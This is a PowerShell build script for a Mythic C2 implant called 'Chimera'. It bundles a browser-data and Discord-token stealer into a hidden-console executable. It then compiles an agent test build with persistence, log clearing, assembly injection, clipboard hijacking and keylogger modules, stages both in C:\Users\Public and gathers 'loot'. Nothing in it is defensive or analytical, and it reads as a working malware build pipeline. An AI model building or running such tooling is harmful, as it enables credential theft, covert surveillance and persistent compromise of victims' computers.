# build_local_test.ps1
# Builds stealer.exe then chimera_local_test.exe
# Run from: C:\projects\chimera-mythic-agent\local_test\
# Usage: powershell -ep bypass .\build_local_test.ps1

$ErrorActionPreference = "Stop"
$here  = Split-Path -Parent $MyInvocation.MyCommand.Path
$agent = Join-Path $here "..\agent_code"
$cmds  = Join-Path $agent "Commands"
$csc   = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
$stage = "C:\Users\Public"
$loot  = "C:\projects\chimera-local-test"

Write-Host ""
Write-Host "======================================="
Write-Host "  STEP 1: Build stealer.exe"
Write-Host "======================================="

$stealerPy  = Join-Path $here "stealer.py"
$stealerExe = Join-Path $here "stealer.exe"
$hbd        = Join-Path $here "hack-browser-data.exe"
$discord    = Join-Path $here "discord_tokens.exe"

if (-not (Test-Path $stealerPy)) { Write-Error "stealer.py not found in $here"; exit 1 }
if (-not (Test-Path $hbd))       { Write-Warning "hack-browser-data.exe not found in $here" }
if (-not (Test-Path $discord))   { Write-Warning "discord_tokens.exe not found in $here" }

$piArgs = "--onefile --noconsole --distpath `"$here`" --workpath `"$here\pyinstaller_build`" --specpath `"$here\pyinstaller_build`""
if (Test-Path $hbd)     { $piArgs += " --add-binary `"$hbd;.`"" }
if (Test-Path $discord) { $piArgs += " --add-binary `"$discord;.`"" }
$piArgs += " `"$stealerPy`""

Write-Host "[*] Running: python -m pyinstaller $piArgs"
Invoke-Expression "python -m pyinstaller $piArgs"

if (-not (Test-Path $stealerExe)) {
    Write-Error "stealer.exe not found after build"
    exit 1
}
$sz = [int]((Get-Item $stealerExe).Length / 1024)
Write-Host "[+] stealer.exe built ($sz KB)"

New-Item -ItemType Directory -Force -Path $stage | Out-Null
Copy-Item $stealerExe "$stage\stealer.exe" -Force
Write-Host "[+] Copied -> $stage\stealer.exe"

Write-Host ""
Write-Host "======================================="
Write-Host "  STEP 2: Build chimera_local_test.exe"
Write-Host "======================================="

if (-not (Test-Path $csc)) { Write-Error "csc.exe not found at $csc"; exit 1 }

$stubFile = Join-Path $here "LocalStubs.cs"
Set-Content $stubFile -Encoding UTF8 -Value @"
// Stubs for local test build - no Mythic server needed
using System;
namespace Chimera {
    public static class C2Http {
        public static string Send(string json) { return "{}"; }
        public static void PostResponse(string uuid, string taskID, string output) { }
        public static string CheckIn() { return null; }
        public static string GetTasking(string uuid) { return null; }
        public static void Sleep() { System.Threading.Thread.Sleep(500); }
    }
    public static class Tasking {
        public static string CallbackUUID = "local-test-uuid";
        public static string ExtractJsonValue(string json, string key) { return null; }
    }
}
"@
Write-Host "[+] LocalStubs.cs written"

$out = Join-Path $here "chimera_local_test.exe"

$sources = @(
    (Join-Path $here "LocalTest.cs"),
    (Join-Path $here "LocalConfig.cs"),
    (Join-Path $here "LocalStubs.cs"),
    (Join-Path $agent "Staging.cs"),
    (Join-Path $agent "StringHelper.cs"),
    (Join-Path $cmds "Shell.cs"),
    (Join-Path $cmds "Ls.cs"),
    (Join-Path $cmds "Pwd.cs"),
    (Join-Path $cmds "Ps.cs"),
    (Join-Path $cmds "Screenshot.cs"),
    (Join-Path $cmds "Persist.cs"),
    (Join-Path $cmds "ClearLogs.cs"),
    (Join-Path $cmds "InjectAssembly.cs"),
    (Join-Path $cmds "Upload.cs"),
    (Join-Path $cmds "Collect.cs"),
    (Join-Path $cmds "Clipper.cs"),
    (Join-Path $cmds "Keylogger.cs"),
    (Join-Path $cmds "Help.cs")
)

$cscArgs = "/target:exe /platform:x86 /out:`"$out`" /r:System.Net.Http.dll /r:System.Drawing.dll /r:System.Management.dll /r:System.ServiceProcess.dll /r:System.Windows.Forms.dll"
foreach ($s in $sources) { $cscArgs += " `"$s`"" }

Write-Host "[*] Compiling chimera_local_test.exe..."
Invoke-Expression "& `"$csc`" $cscArgs"

if ($LASTEXITCODE -ne 0) { Write-Error "Compile failed"; exit 1 }

$sz2 = [int]((Get-Item $out).Length / 1024)
Write-Host "[+] chimera_local_test.exe built ($sz2 KB)"

Copy-Item $out "$stage\chimera_local_test.exe" -Force
Write-Host "[+] Copied -> $stage\chimera_local_test.exe"

Write-Host ""
Write-Host "======================================="
Write-Host "  BUILD COMPLETE"
Write-Host "======================================="
Write-Host ""
Write-Host "Run (as Admin):"
Write-Host "  cd $stage"
Write-Host "  .\chimera_local_test.exe"
Write-Host ""
Write-Host "Log + loot zip -> $loot"
